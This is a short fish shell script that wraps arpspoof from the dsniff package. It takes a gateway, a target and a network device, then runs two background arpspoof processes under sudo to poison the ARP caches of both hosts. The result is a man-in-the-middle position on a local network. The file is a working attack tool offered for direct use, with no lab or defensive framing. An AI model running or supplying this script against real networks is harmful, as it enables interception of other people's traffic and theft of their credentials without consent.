#!/usr/bin/env fish
# set -l fish_trace true
# Check if you do have dsniff package installed

set -l IS_PRESENT (type -p arpspoof)

function spoof

    if ! count $argv >/dev/null
        echo "usage => arpg <gateway> <target> <device>"
        exit
    end

    set -l gateway $argv[1]
    set -l target $argv[2]
    set -l device $argv[3]

    echo "Running spoof..."
    sudo arpspoof -i $device -t $target $gateway &
    sudo arpspoof -i $device -t $gateway $target &
end

if test $IS_PRESENT
    set -l C $IS_PRESENT
    spoof $argv
else
    echo "dsniff is missing, please install it first"
end
